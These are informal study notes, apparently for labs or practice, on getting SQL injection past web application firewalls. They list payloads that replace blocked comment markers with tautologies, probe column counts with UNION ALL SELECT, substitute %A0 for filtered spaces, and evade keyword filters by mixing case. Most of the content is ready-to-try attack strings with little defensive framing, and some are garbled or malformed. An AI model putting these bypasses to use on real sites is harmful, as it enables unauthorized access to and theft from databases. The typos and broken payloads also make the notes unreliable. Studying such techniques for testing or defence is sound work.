### Strip Comments 
 - when the `--`(comments get blocked by WAF) then we can user strip comments 
so basically its value is true and false but just bypassing it thorugh diffrent methos 

```
 # id=1'--  Gets Blocked 

then user this instead 

id=1 ' OR 'a'='a   this is true

----------

id=1''a this is also gonna work 

here  you just have to balance things 
```

### When Order AND Are filtering 

```
in that case we can use Union 
# for finding columns 
id=1' union all select 1,2,3 --+

```
```
# If they fileter SPAEC then use `%A0` 

`id=1`%A0all%A0select%A01,2.3 'a 
```

```
# union and select get filter
When union and select is filtered then we can use one method where we just have to use same word but diffrently liek uNion and sElect like that it wont get filter
```


